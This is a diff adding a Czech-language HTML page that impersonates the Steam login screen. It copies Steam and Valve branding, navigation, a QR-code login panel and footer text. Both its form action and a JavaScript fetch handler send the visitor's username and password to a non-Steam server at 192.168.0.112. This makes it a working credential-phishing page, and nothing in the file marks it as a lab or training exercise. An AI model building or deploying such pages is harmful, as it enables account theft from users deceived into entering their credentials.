@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steam-like Přihlášení</title>
+    <style>
+        body {
+            background-color: #1b2838;
+            color: #c7d5e0;
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: linear-gradient(to bottom, #1b2838 50%, #171a21 100%), no-repeat center center fixed;
+            background-image: url(/images/steam-library-update-2.png);
+            background-size: cover;
+        }
+
+        header {
+            background-color: #171a21;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
+        }
+
+        .logo img {
+            height: 30px;
+        }
+
+        nav {
+            display: flex;
+            align-items: center;
+        }
+
+        nav a {
+            color: #b8b6b4;
+            text-decoration: none;
+            margin: 0 10px;
+            font-size: 14px;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+        }
+
+        nav a img {
+            height: 16px;
+            margin-right: 5px;
+        }
+
+        nav a:hover {
+            color: #ffffff;
+        }
+
+        .language {
+            color: #67c1f5;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+        }
+
+        .language img {
+            height: 12px;
+            margin-right: 5px;
+        }
+
+        main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            display: flex;
+            background-color: #32353c;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            width: 600px;
+            max-width: 90%;
+        }
+
+        .login-form, .qr-code {
+            flex: 1;
+            padding: 10px;
+        }
+
+        .login-form h2, .qr-code h2 {
+            font-size: 18px;
+            color: #67c1f5;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .login-form label {
+            display: block;
+            font-size: 12px;
+            color: #b8b6b4;
+            margin-bottom: 5px;
+        }
+
+        .login-form input[type="text"],
+        .login-form input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            background-color: #1b2838;
+            border: 1px solid #2a3e52;
+            border-radius: 3px;
+            color: #c7d5e0;
+            font-size: 14px;
+        }
+
+        .login-form input[type="checkbox"] {
+            margin-right: 5px;
+        }
+
+        .login-form .checkbox-label {
+            font-size: 12px;
+            color: #b8b6b4;
+        }
+
+        .login-form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #67c1f5;
+            border: none;
+            border-radius: 3px;
+            color: #171a21;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .login-form button:hover {
+            background-color: #4682b4;
+        }
+
+        .qr-code {
+            text-align: center;
+        }
+
+        .qr-placeholder img {
+            width: 150px;
+            height: 150px;
+            border-radius: 3px;
+        }
+
+        .qr-code p {
+            font-size: 12px;
+            color: #b8b6b4;
+            margin: 0;
+        }
+
+        .qr-code a {
+            color: #67c1f5;
+            text-decoration: none;
+        }
+
+        .qr-code a:hover {
+            text-decoration: underline;
+        }
+
+        footer {
+            background-color: #171a21;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #b8b6b4;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        footer a {
+            color: #67c1f5;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        .valve-logo img, .steam-logo img {
+            height: 40px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="/images/GauNfb.png" alt="Steam Logo">
+        </div>
+        <nav>
+            <a href="#"> Obchod</a>
+            <a href="#"> Komunita</a>
+            <a href="#"> Informace</a>
+            <a href="#"> Podpora</a>
+        </nav>
+        <div class="language">
+            <img src="https://img.icons8.com/ios-filled/50/ffffff/globe.png" alt="Language Icon"> čeština <span>▼</span>
+        </div>
+    </header>
+
+    <main>
+        <div class="login-container">
+            <div class="login-form">
+                <h2>Přihlášení</h2>
+                <form id="loginForm" action="http://192.168.0.112/login" method="POST">
+                    <label for="username">Přihlaste se pomocí názvu účtu</label>
+                    <input type="text" id="username" name="username" required>
+                    <label for="password">Heslo</label>
+                    <input type="password" id="password" name="password" required>
+                    <label class="checkbox-label">
+                        <input type="checkbox" name="remember"> Pamatovat si mě
+                    </label>
+                    <button type="submit">Přihlásit se</button>
+                </form>
+            </div>
+
+            <div class="qr-code">
+                <h2>Nebo pomocí QR kódu</h2>
+                <div class="qr-placeholder">
+                    <img src="/images/qrcode_206606045_4529ab7398643e9212c4c637ffd4409c.png" alt="QR Code">
+                </div>
+                <p>Pro přihlášení pomocí QR kódu použijte mobilní aplikaci.<br>
+                <a href="#">Pomozte mi, nemohu se přihlásit</a></p>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="valve-logo">
+            <img src="/images/Valve.png" alt="Valve Logo">
+        </div>
+        <p>Nejprve ve službě Steam! Objevte tisíce skvělých her a miliony nových přátel. Registrace je navíc zcela zdarma.<br>
+        <a href="#">Zjistěte o službě Steam více</a></p>
+        <div class="steam-logo">
+            <img src="/images/GauNfb.png" alt="Steam Logo">
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                const response = await fetch('http://192.168.0.112/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+                });
+                if (response.ok) {
+                    const data = await response.text();
+                    alert(data);
+                } else {
+                    alert('Chyba při přihlášení: ' + response.statusText);
+                }
+            } catch (error) {
+                alert('Nepodařilo se připojit k serveru: ' + error.message);
+            }
+        });
+    </script>
+</body>
+</html>
